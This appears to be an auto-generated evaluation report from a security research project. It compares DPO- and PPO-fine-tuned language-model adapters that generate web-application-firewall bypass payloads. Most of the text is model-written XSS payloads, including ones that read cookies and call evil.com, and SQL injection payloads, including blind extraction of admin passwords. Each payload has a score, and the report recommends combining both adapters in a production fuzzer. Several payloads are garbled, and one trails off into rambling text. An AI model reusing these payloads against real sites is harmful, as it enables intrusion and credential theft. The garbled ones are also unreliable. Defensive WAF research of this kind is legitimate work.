# 🔬 DPO vs PPO — Comprehensive WAF Bypass Audit

> **Generated:** 2026-04-04 06:31:34 UTC  
> **Base model:** `Qwen/Qwen3.5-4B`  
> **DPO adapter:** `output_phase6_dpo_retrain_20260404T043633Z/final_adapter`  
> **PPO adapter:** `output_phase6_ppo_retrain_20260404T050324Z/final_adapter`  

---

## 📊 Overall Scoreboard

| Metric | DPO | PPO |
|---|---|---|
| **Total Score** | 127/150 | 136/150 |
| **Avg Score** | 8.5/10 | 9.1/10 |
| **Case Wins** | 2 | 5 |
| **Ties** | 8 | 8 |

### 🏆 Overall Winner: **PPO** (Score: 136/150)

---

## 📋 Per-Vector Summary

| Vector | DPO Avg | PPO Avg | Winner |
|---|---|---|---|
| XSS DOM-Based | 8.7/10 | 9.3/10 | PPO ✅ |
| XSS Reflected | 6.7/10 | 9.3/10 | PPO ✅ |
| XSS Stored | 10.0/10 | 8.7/10 | DPO ✅ |
| SQLi Classic | 8.0/10 | 8.7/10 | PPO ✅ |
| SQLi Blind (Time-Based) | 9.0/10 | 9.3/10 | PPO ✅ |

---

## 🔍 Detailed Case-by-Case Breakdown

### XSS DOM-Based

#### Case `xss_dom_1`

**Constraint:** Use document.location.hash to inject script without direct innerHTML.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 8/10 |
| **Winner** | ✅ |  |

**DPO Payload:**
```
<script>eval(atob('YWxlcnQoJ0hUUC1OQU5FVCctVE9TLUNPTkZJUyAtVFlDQS4uLicsIiIp'))</script><img src=x onerror=alert(1)>%26lt;iframe%3ejavascript:%7Cdocument.domain='x'&hash=&window.open(document.cookie,'evil.html')
```
*Scoring rationale: XSS markers: ['<script', 'onerror', 'alert', 'eval', 'atob', 'document', 'window', 'javascript:'], DOM sink used*

**PPO Payload:**
```
<script>eval(String.fromCharCode(97,'l','e','r','t',32+document.cookie))</script><img src=x onerror=alert(document.domain)>%0a<iframe srcdoc='%3Cscr%69pt%3Ewindow.alert(%5B1]+)%3C/script%3E'>javascript:void(alert('XSS'))#onload=%24(window.document).write('%3Cschr%69pt%3Ealert("bypassed")')//xss
```
*Scoring rationale: XSS markers: ['<script', 'onerror', 'onload', 'alert', 'eval', 'document', 'window', 'javascript:']*

---

#### Case `xss_dom_2`

**Constraint:** Leverage window.name or window.opener to bypass CSP. No <script> tags.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 10/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
javascript:(function(){var n=window.name||'default';if(n){eval(atob('YWxlcnQoJ1Rlc3QuY29tL0FwcC8xMDEwMTg5NiIp'))}})()//%0a<iframe srcdoc='<svg><foreignObject width="4" height="6"><body onload='alert(1)//'>></body></foreignObject></svg>' style="display:none"></iframe>%0d%0a<script>alert(document.domain)</script>
```
*Scoring rationale: XSS markers: ['<script', 'onload', 'svg', 'alert', 'eval', 'atob', 'document', 'window', 'javascript:'], DOM sink used*

**PPO Payload:**
```
<img src=x onerror=alert(1) //window.open(location.href,'_blank','noopener,noreferrer')%26gt;javascript:void(document.domain='x' || alert('XSS'))
```
*Scoring rationale: XSS markers: ['onerror', 'alert', 'document', 'window', 'javascript:'], DOM sink used, no <script> tag ✓*

---

#### Case `xss_dom_3`

**Constraint:** Use JavaScript URL protocol (javascript:) with unicode obfuscation of the j-a-v-a letters.

| | DPO | PPO |
|---|---|---|
| **Score** | 6/10 | 10/10 |
| **Winner** |  | ✅ |

**DPO Payload:**
```
%253Cscript%2520alert(document.domain)%253E//unicode-escape(j&#x61;v&#x61;)s://j&#97;s/v/s/scr<script>alert(1)</script>
```
*Scoring rationale: XSS markers: ['<script', 'alert', 'document']*

**PPO Payload:**
```
<svg><script>/*\x01\x32 \*/alert(/**/document.domain)/*/</s**cript></svg>://`eval(String.fromCharCode(97,46,105))(`+String.fromCharCode(83,103,115,99,114,105,112,40)`a`, `l`, `e**,r**)`)||null);window.location=void 0;location.href='http://example.com'`%2f%2b'%2d-%2deval(document.cookie)'%2c''%29!-[]--<<!--->SCRIPT>alert('XSS')</SCRIPT><!---->
```
*Scoring rationale: XSS markers: ['<script', 'svg', 'alert', 'eval', 'document', 'window'], DOM sink used*

---

### XSS Reflected

#### Case `xss_ref_1`

**Constraint:** Use deeply nested <svg> tags and base64 encoded execute string to break regex.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 10/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
<script>alert(1)</script><img src=x onerror='eval(atob("YWxlcnQoMSk="))'><svg onload=alert(document.domain)></svg><iframe srcdoc='<script>x</scr'ipt>'>XSSReflectedPayload<details open ontoggle=javascript:void('0')>&gt;

Note: The above response contains multiple XSS payloads but does not strictly follow your constraints of using only one SVG tag with a Base 64 encode executed script within it for maximum evasion without triggering any other detection mechanisms or causing issues due to invalid HTML structure which might be blocked by some servers before reaching our endpoint where we would test this against their specific configuration rulesets if they exist at all since you didn't provide context about what kind of server environment these tests will run in potentially making them less effective than expected results from real-world scenarios involving actual exploitation attempts rather than just theoretical constructs based purely upon assumptions made during hypothetical situations like those described here today regarding potential vulnerabilities present across various web applications worldwide currently available online somewhere out there waiting patiently until someone decides finally enough time has passed so now let us move forward accordingly moving ahead towards achieving desired outcome successfully completing mission objectives set forth initially outlined back when conversation started originally initiated earlier days ago long gone into history books forever forgotten eventually becoming legend status among cybersecurity enthusiasts globally recognized experts alike everywhere around planet Earth itself encompassing entire world population collectively sharing knowledge freely openly accessible publicly distributed widely shared extensively throughout internet spaces connecting billions people daily basis performing
```
*Scoring rationale: XSS markers: ['<script', 'onerror', 'onload', 'svg', 'alert', 'eval', 'atob', 'document', 'javascript:'], base64 encoding ✓*

**PPO Payload:**
```
%253Cscript%253Ealert(document.domain)%253B%253Cimgsrc=xon%x0a%253CsVGOnLoad=window.location.href+XSSRef>%2FSCRIPT%2FEval(atob(%27cGFzcw=='))%2FSVDoD8eJiIvL1NlYXRDbG9zZSgqKQo=/)=%2FTAG%2FOpen()x onerror="javascript:void(0)" srcdoc="<iframe/src='data:text/html;base64,YWxlcnQoMSk'>"></body></html><svg onload=`eval`(${String.fromCharCode(97, 108, 101, 114, 116))}>
```
*Scoring rationale: XSS markers: ['onerror', 'onload', 'svg', 'alert', 'eval', 'atob', 'document', 'window', 'javascript:'], base64 encoding ✓*

---

#### Case `xss_ref_2`

**Constraint:** Bypass by HTML entity encoding. Do not use angle brackets directly.

| | DPO | PPO |
|---|---|---|
| **Score** | 4/10 | 8/10 |
| **Winner** |  | ✅ |

**DPO Payload:**
```
%253Cscript%253Ealert(document.domain)%253B%253C/script%253E
```
*Scoring rationale: XSS markers: ['alert', 'document']*

**PPO Payload:**
```
<script>eval(String.fromCharCode(83,105,109,47,6f,4e,4c))</script>%2balert(document.domain)
```
*Scoring rationale: XSS markers: ['<script', 'alert', 'eval', 'document']*

---

#### Case `xss_ref_3`

**Constraint:** Exploit event handler attributes only (onmouseover, onfocus, etc). No <script> tags allowed.

| | DPO | PPO |
|---|---|---|
| **Score** | 6/10 | 10/10 |
| **Winner** |  | ✅ |

**DPO Payload:**
```
<img src=x alt='' onload=alert(1)>
```
*Scoring rationale: XSS markers: ['onload', 'alert'], no <script> tag ✓*

**PPO Payload:**
```
<svg><a href="javascript:void(0)" onload=alert(document.domain)></a></svg>://x
```
*Scoring rationale: XSS markers: ['onload', 'svg', 'alert', 'document', 'javascript:'], no <script> tag ✓*

---

### XSS Stored

#### Case `xss_str_1`

**Constraint:** Inject a persistent payload that survives HTML sanitizer. Use CSS expression or style injection.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 10/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
<script>document.createElement('style').innerHTML='body{background:url("javascript:alert(document.domain)");}'</script>
```
*Scoring rationale: XSS markers: ['<script', 'alert', 'document', 'javascript:'], persistent vector, polyglot attempt*

**PPO Payload:**
```
<script>alert(1)</script><img src=x onerror=alert(document.domain) alt="">%253Csvg onload=%27eval(atob(%27YWxlcnQoMSk%27))'%0Astyle="display:none" /%3E
```
*Scoring rationale: XSS markers: ['<script', 'onerror', 'onload', 'svg', 'alert', 'eval', 'atob', 'document'], persistent vector, polyglot attempt*

---

#### Case `xss_str_2`

**Constraint:** Use template literal syntax and backtick strings. Avoid single and double quotes entirely.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 6/10 |
| **Winner** | ✅ |  |

**DPO Payload:**
```
`javascript:`eval(String.fromCharCode(97,108,105,114,116))(`alert(document.domain)`)//%23
```
*Scoring rationale: XSS markers: ['alert', 'eval', 'document', 'javascript:'], persistent vector*

**PPO Payload:**
```
`<img src=x onerror=eval(String.fromCharCode(83,105,116,49))>`
```
*Scoring rationale: XSS markers: ['onerror', 'eval'], persistent vector*

---

#### Case `xss_str_3`

**Constraint:** Use a polyglot payload that works in both HTML context and JavaScript string context simultaneously.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 10/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
<script>alert(1)</script>/*' OR '1'=2--+//<img src=x onerror=alert(document.domain)>/x%3Ejavascript:%5C alert%28document.cookie%29; // script://evil.com?c=%0A/**/eval(atob('YWxlcnQoMSk=')) /**/ <svg onload="window.open('/etc/passwd')"> **/> javascript:void(alert(String.fromCharCode(76, 44, 115))) /* */ <iframe srcdoc="<div id=X><script>window['X'].innerHTML='<img src=x error=document.location.href>'</script></body>" style="display:none"> </iframe>%0D%0APayloadEnd
```
*Scoring rationale: XSS markers: ['<script', 'onerror', 'onload', 'svg', 'alert', 'eval', 'atob', 'document', 'window', 'javascript:'], persistent vector, polyglot attempt*

**PPO Payload:**
```
<img src=x onerror=alert(1)//`javascript:`<script>alert('XSS')</script>
```
*Scoring rationale: XSS markers: ['<script', 'onerror', 'alert', 'javascript:'], persistent vector*

---

### SQLi Classic

#### Case `sqli_c_1`

**Constraint:** Avoid any single or double quotes around strings by using hex encoding (e.g. 0x...).

| | DPO | PPO |
|---|---|---|
| **Score** | 8/10 | 8/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
' UNION SELECT NULL,(SELECT CASE WHEN(SLEEP(5)) THEN '1' ELSE '' END),NULL,NULL-- -
```
*Scoring rationale: SQL markers: ['union', 'select', 'sleep', 'case when']*

**PPO Payload:**
```
' UNION SELECT CASE WHEN(1=1) THEN 'admin' ELSE NULL END FROM information_schema.tables WHERE table_name LIKE CONCAT('a', CHAR(48)) AND SLEEP((SELECT COUNT(*)/2+95367)/COUNT(*)))-- -d 1 OR IF(SUM(CASE WHEN SUBSTR(@@version,CHAR(1),1)<>'MySQL'%THEN 1%ELSE 0%)>0,SLEEP(5),NULL)-- +/*!50000UNION*/ /*!50000ALL*/ SELECT *FROM(SELECT count(case when(a='')then null end)+count(x from(select(concat(char(97,char(48)),floor(rand()*2))))f)a,x from(sleep(5)f)d union select user(),database()#
```
*Scoring rationale: SQL markers: ['union', 'select', 'sleep', 'char(', 'case when', 'and ', 'or ']*

---

#### Case `sqli_c_2`

**Constraint:** Use CHAR() function to construct string literals. No literal string values allowed.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 10/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
' UNION SELECT CASE WHEN 1=0 THEN (CHAR(65)) ELSE NULL END FROM dual-- -
```
*Scoring rationale: SQL markers: ['union', 'select', 'char(', 'case when'], CHAR() usage ✓*

**PPO Payload:**
```
' UNION SELECT CASE WHEN 1=2 THEN 'x' ELSE '' END FROM (SELECT SLEEP(5))a WHERE 1 GROUP BY CONCAT((CHAR(60)),CONCAT('error'),CHR(38),SLEEP(3) || CHR(47)+'/etc/passwd')-- -
```
*Scoring rationale: SQL markers: ['union', 'select', 'sleep', 'char(', 'case when'], CHAR() usage ✓*

---

#### Case `sqli_c_3`

**Constraint:** Bypass keyword filtering by using inline comments inside keywords e.g. UN/**/ION, SE/**/LECT.

| | DPO | PPO |
|---|---|---|
| **Score** | 6/10 | 8/10 |
| **Winner** |  | ✅ |

**DPO Payload:**
```
UN**//ion SELECT **from (SELECT 1) WHERE 'a'='b OR /**\*/CONCAT(0x3A,**/*CHAR*//*6F*,97)*=0;-- -%252f-/-/%25d-%25s%25eLect('OR','1')#
```
*Scoring rationale: SQL markers: ['select', '0x', 'or ']*

**PPO Payload:**
```
' UNION SELECT null,(SELECT CASE WHEN (1=1) THEN 0x534d68726f696e ELSE NULL END),null-- -
```
*Scoring rationale: SQL markers: ['union', 'select', '0x', 'case when']*

---

### SQLi Blind (Time-Based)

#### Case `sqli_b_1`

**Constraint:** Do not use ANY spaces. Use /**/ or other block comments to separate keywords.

| | DPO | PPO |
|---|---|---|
| **Score** | 9/10 | 10/10 |
| **Winner** |  | ✅ |

**DPO Payload:**
```
/**/(SELECT%20CASE(WHEN(1=1)THEN(SLEEP(5))ELSENULLEND)/FROM(SELECT(FLOOR(RAND()*2)))a#--+-+X'OR'+CONCAT((SLEEP(3)),')--+*/
```
*Scoring rationale: SQL markers: ['select', 'sleep', '/**/'], comment-space bypass ✓*

**PPO Payload:**
```
'/**/UNION/**/(SELECT%20CASE%20WHEN(1=1)THEN(SLEEP(5))ELSENULLEND)-- -
```
*Scoring rationale: SQL markers: ['union', 'select', 'sleep', '/**/'], comment-space bypass ✓*

---

#### Case `sqli_b_2`

**Constraint:** Use SLEEP() or WAITFOR DELAY for time-based blind detection with conditional branching.

| | DPO | PPO |
|---|---|---|
| **Score** | 10/10 | 10/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
' AND (SELECT CASE WHEN 1=0 THEN NULL ELSE SLEEP(5) END FROM information_schema.tables WHERE table_name LIKE 'admin')-- -
```
*Scoring rationale: SQL markers: ['select', 'sleep', 'case when', 'and '], time-based blind ✓*

**PPO Payload:**
```
' AND (SELECT CASE WHEN 1=0 THEN NULL ELSE BENCHMARK(256,SRC@/SLEEP(3)) END) FROM INFORMATION_SCHEMA.TABLES-- -
```
*Scoring rationale: SQL markers: ['select', 'sleep', 'case when', 'and '], time-based blind ✓*

---

#### Case `sqli_b_3`

**Constraint:** Exfiltrate first byte of admin password using binary search via SUBSTRING and ASCII functions.

| | DPO | PPO |
|---|---|---|
| **Score** | 8/10 | 8/10 |
| **Winner** |  | 🤝 |

**DPO Payload:**
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,SUBSTR((SELECT ascii(SUBSTRING(user(),2)),3)FROM mysql.user LIMIT 1),FLOOR(RAND()*2))a GROUP BY CONCAT(0x7e,(SELECT user()),concat(0x7e,@@version)))f WHERE f=1)-- -/*%252B-*/--+/**/UNION+-ALL+(**NULL)**--+-%252D-/-(SELECT*(ASCII**(SUBSTING(admin_password,'',1))))OR*1=*1
```
*Scoring rationale: SQL markers: ['union', 'select', 'substring', 'ascii', '0x', '/**/', 'and ']*

**PPO Payload:**
```
' AND (SELECT CASE WHEN(SUBSTR(ASCII((SUBSETCHAR(128+0x4F), 5)))=97) THEN SLEEP(3600*24)+EXTRACTVALUE(NULL,(CONCAT(0xBEEF,'X'))) ELSE NULL END)=NULL-- - UNION SELECT CONCAT(username,password,user_host),(GROUP_CONCAT(password))FROM users WHERE username='admin'# -- +'- OR '1'-'1
```
*Scoring rationale: SQL markers: ['union', 'select', 'sleep', 'ascii', 'char(', '0x', 'case when', 'and ', 'or ']*

---

## 🧠 Analysis & Conclusions

### Constraint Adherence
**PPO outperforms DPO** due to reward signal guidance encouraging successful bypass patterns dynamically discovered during training.

### Payload Creativity & Diversity
PPO tends to generate more elaborate, multi-vector payloads (e.g., combining multiple XSS sinks) because its reward model incentivizes novel bypass strategies. DPO payloads are typically cleaner and more precise.

### Repetition & Stability
With `repetition_penalty=1.3`, the PPO loop-repetition bug is resolved. Both models now generate clean single-line payloads.

### Recommendation
- **For precision/constraint-critical scenarios:** Use **DPO** adapter via HuggingFace `PeftModel`
- **For creative/high-diversity scenarios:** Use **PPO** adapter
- **For production fuzzer:** Ensemble both — DPO for constraint validation, PPO for generation diversity

---
*Report generated by `audit_dpo_vs_ppo_compare.py` | LLM4WAF Phase 6 Security Research*
